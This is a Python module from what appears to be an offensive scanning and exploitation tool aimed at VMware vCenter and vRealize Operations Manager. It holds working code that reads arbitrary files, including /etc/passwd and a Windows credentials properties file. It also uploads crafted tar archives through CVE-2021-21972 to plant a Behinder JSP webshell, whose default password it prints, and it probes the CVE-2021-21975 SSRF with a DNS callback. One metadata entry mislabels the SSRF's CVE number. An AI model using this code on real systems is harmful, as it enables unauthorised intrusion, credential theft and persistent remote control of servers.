#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import os
import sys
import threading
from module.api.dns import dns_request
from module.api.dns import dns_result
from thirdparty import requests
from thirdparty.requests.compat import urljoin
from module import globals
from core.verify import verify
from thirdparty.requests_toolbelt.utils import dump


class Vmware():
    def __init__(self, url):
        self.url = url
        self.raw_data = None
        self.vul_info = {}
        self.ua = globals.get_value("UA")  # 获取全局变量UA
        self.timeout = globals.get_value("TIMEOUT")  # 获取全局变量UA
        self.headers = globals.get_value("HEADERS")  # 获取全局变量HEADERS
        self.threadLock = threading.Lock()


    def time_2020_1013_poc(self):
        self.threadLock.acquire()
        self.vul_info["prt_name"] = "Vmware vCenter: time-2020-10-13 (not cve)"
        self.vul_info["prt_resu"] = "null"
        self.vul_info["prt_info"] = "null"
        self.vul_info["vul_urls"] = self.url
        self.vul_info["vul_payd"] = "null"
        self.vul_info["vul_name"] = "Vmware vCenter 任意文件读取"
        self.vul_info["vul_numb"] = "time-2020-10-13"
        self.vul_info["vul_apps"] = "Vmware"
        self.vul_info["vul_date"] = "2020-10-13"
        self.vul_info["vul_vers"] = "<= 6.5u1"
        self.vul_info["vul_risk"] = "high"
        self.vul_info["vul_type"] = "任意文件读取"
        self.vul_info["vul_data"] = "null"
        self.vul_info["vul_desc"] = "Unauthenticated Arbitrary File Read vulnerability in VMware vCenter. VMware revealed that this vulnerability was patched in 6.5u1, but no CVE was assigned."
        self.vul_info["cre_date"] = "2021-02-26"
        self.vul_info["cre_auth"] = "zhzyker"
        headers = {
            "User-agent": self.ua,
            "Connection": "close",
        }
        try:
            url = urljoin(self.url, "/eam/vib?id=/etc/passwd")
            res = requests.get(url, headers=headers, timeout=self.timeout, verify=False)
            if res.status_code == 200 and r"root:/bin/bash" in res.text and r"root:x:0:0" in res.text:
                self.vul_info["vul_data"] = dump.dump_all(res).decode('utf-8', 'ignore')
                self.vul_info["prt_resu"] = "PoCSuCCeSS"
                self.vul_info["vul_payd"] = url
                self.vul_info["prt_info"] = "[file] [os:linux] [url:" + url + " ]"

            else:
                url = urljoin(self.url, "/eam/vib?id=C:\ProgramData\VMware\vCenterServer\cfg\vmware-vpx\vcdb.properties")
                res = requests.get(url, headers=headers, timeout=self.timeout, verify=False)
                if res.status_code == 200 and r"username" in res.text and r"password" in res.text and r"dirver" in res.text:
                    self.vul_info["vul_data"] = dump.dump_all(res).decode('utf-8', 'ignore')
                    self.vul_info["prt_resu"] = "PoCSuCCeSS"
                    self.vul_info["vul_payd"] = url
                    self.vul_info["prt_info"] = "[file] [os:windows] [url:" + url + " ]"
            verify.scan_print(self.vul_info)
        except requests.exceptions.Timeout:
            verify.timeout_print(self.vul_info["prt_name"])
        except requests.exceptions.ConnectionError:
            verify.connection_print(self.vul_info["prt_name"])
        except Exception as error:
            verify.error_print(self.vul_info["prt_name"])
        self.threadLock.release()

    def cve_2021_21972_poc(self):
        self.threadLock.acquire()
        self.vul_info["prt_name"] = "Vmware vCenter: CVE-2021-21972"
        self.vul_info["prt_resu"] = "null"
        self.vul_info["prt_info"] = "null"
        self.vul_info["vul_urls"] = self.url
        self.vul_info["vul_payd"] = "null"
        self.vul_info["vul_name"] = "Vmware vCenter 任意文件上传"
        self.vul_info["vul_numb"] = "CVE-2021-21972"
        self.vul_info["vul_apps"] = "Vmware"
        self.vul_info["vul_date"] = "2021-02-24"
        self.vul_info["vul_vers"] = "7.0 < 7.0 U1c, 6.7 < 6.7 U3l, 6.5 < 6.5 U3n"
        self.vul_info["vul_risk"] = "high"
        self.vul_info["vul_type"] = "任意文件上传"
        self.vul_info["vul_data"] = "null"
        self.vul_info["vul_desc"] = "未经授权的文件上传会导致远程执行代码（RCE）（CVE-2021-21972）"
        self.vul_info["cre_date"] = "2021-02-25"
        self.vul_info["cre_auth"] = "zhzyker"
        headers = {
            "User-agent": self.ua,
            "Connection": "close",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        try:
            url = urljoin(self.url, "/ui/vropspluginui/rest/services/uploadova")
            res = requests.get(url, headers=headers, timeout=self.timeout, verify=False)
            if res.status_code == 405:
                self.vul_info["vul_data"] = dump.dump_all(res).decode('utf-8', 'ignore')
                self.vul_info["prt_resu"] = "PoC_MaYbE"
                self.vul_info["vul_payd"] = url
                self.vul_info["prt_info"] = "[upload] [url:" + url + " ]"
                headers = {
                    "User-Agent": self.ua,
                    "Accept": "*/*",
                    "Connection": "close"
                }
                path = os.path.split(os.path.realpath(sys.argv[0]))[0]
                linux_tar = path + "/payload/payload/cve202121972_linux.tar"
                file = {'uploadFile': open(linux_tar, 'rb')}
                url = urljoin(self.url, "/ui/vropspluginui/rest/services/uploadova")
                r = requests.post(url, files=file, headers=headers, timeout=self.timeout, verify=False)
                url = requests.compat.urljoin(self.url, "/ui/resources/vvvvvv.txt")
                req = requests.get(url, headers=headers, timeout=self.timeout, verify=False)
                if r"upload" in req.text:
                    self.vul_info["vul_data"] = dump.dump_all(r).decode('utf-8', 'ignore')
                    self.vul_info["prt_resu"] = "PoCSuCCeSS"
                    self.vul_info["vul_payd"] = linux_tar
                    self.vul_info["prt_info"] = "[upload] [os:linux] [url:" + url + " ]"
                else:
                    windows_tar = path + "/payload/payload/cve202121972_windows.tar"
                    file = {'uploadFile': open(windows_tar, 'rb')}
                    url = requests.compat.urljoin(self.url, "/ui/vropspluginui/rest/services/uploadova")
                    r = requests.post(url, files=file, headers=headers, timeout=self.timeout, verify=False)
                    url = requests.compat.urljoin(self.url, "/ui/resources/vvvvvv.txt")
                    req = requests.get(url, headers=headers, timeout=self.timeout, verify=False)
                    if r"upload" in req.text:
                        self.vul_info["vul_data"] = dump.dump_all(r).decode('utf-8', 'ignore')
                        self.vul_info["prt_resu"] = "PoCSuCCeSS"
                        self.vul_info["vul_payd"] = windows_tar
                        self.vul_info["prt_info"] = "[upload] [os:windows] [url:" + url + " ]"
            verify.scan_print(self.vul_info)
        except requests.exceptions.Timeout:
            verify.timeout_print(self.vul_info["prt_name"])
        except requests.exceptions.ConnectionError:
            verify.connection_print(self.vul_info["prt_name"])
        except Exception as error:
            verify.error_print(self.vul_info["prt_name"])
        self.threadLock.release()

    def cve_2021_21972_exp(self, cmd, os_type):
        vul_name = "Vmware vCenter: CVE-2021-21972"
        headers = {
            "User-Agent": self.ua,
            "Accept": "*/*",
            "Connection": "close"
        }
        try:
            cmd = cmd
            path = os.path.split(os.path.realpath(sys.argv[0]))[0]
            if os_type == "linux":
                shell_tar = path + "/payload/payload/cve202121972_linux_shell.tar"
            else:
                shell_tar = path + "/payload/payload/cve202121972_windows_shell.tar"
            file = {'uploadFile': open(shell_tar, 'rb')}
            url = requests.compat.urljoin(self.url, "/ui/vropspluginui/rest/services/uploadova")
            req = requests.post(url, files=file, headers=headers, timeout=self.timeout, verify=False)
            url = requests.compat.urljoin(self.url, "/ui/resources/shell.jsp")
            r = "Payload: " + shell_tar + "\n" + "Behiner jsp webshell (default password:rebeyond) : " + url
            self.raw_data = dump.dump_all(req).decode('utf-8', 'ignore')
            verify.exploit_print(r, self.raw_data)
        except requests.exceptions.Timeout:
            verify.timeout_print(vul_name)
        except requests.exceptions.ConnectionError:
            verify.connection_print(vul_name)
        except Exception as e:
            verify.error_print(vul_name)

    def cve_2021_21975_poc(self):
        self.threadLock.acquire()
        self.vul_info["prt_name"] = "VMware vRealize Operations Manager: CVE-2021-21975"
        self.vul_info["prt_resu"] = "null"
        self.vul_info["prt_info"] = "null"
        self.vul_info["vul_urls"] = self.url
        self.vul_info["vul_payd"] = "null"
        self.vul_info["vul_name"] = "VMware vRealize Operations Manager API SSRF"
        self.vul_info["vul_numb"] = "CVE-2021-21972"
        self.vul_info["vul_apps"] = "Vmware"
        self.vul_info["vul_date"] = "2021-03-31"
        self.vul_info["vul_vers"] = "<= 8.3.0"
        self.vul_info["vul_risk"] = "high"
        self.vul_info["vul_type"] = "SSRF"
        self.vul_info["vul_data"] = "null"
        self.vul_info["vul_desc"] = "攻击者通过访问vRealize Operations Manager API传递特定的参数到服务器端进行请求伪造攻击"
        self.vul_info["cre_date"] = "2021-04-01"
        self.vul_info["cre_auth"] = "zhzyker"
        try:
            headers = {
                "User-Agent": self.ua,
                "Content-Type": "application/json;charset=UTF-8"
            }
            dns = dns_request()
            data = '["'+dns+'"]'
            url = urljoin(self.url, "/casa/nodes/thumbprints")
            res = requests.post(url, data=data, headers=headers, timeout=self.timeout, verify=False)
            if dns_result(dns):
                self.vul_info["vul_data"] = dump.dump_all(res).decode('utf-8', 'ignore')
                self.vul_info["prt_resu"] = "PoCSuCCeSS"
                self.vul_info["vul_payd"] = data
                self.vul_info["prt_info"] = "[ssrf] [dns:" + dns + " ]"
            verify.scan_print(self.vul_info)
        except requests.exceptions.Timeout:
            verify.timeout_print(self.vul_info["prt_name"])
        except requests.exceptions.ConnectionError:
            verify.connection_print(self.vul_info["prt_name"])
        except Exception as error:
            verify.error_print(self.vul_info["prt_name"])
        self.threadLock.release()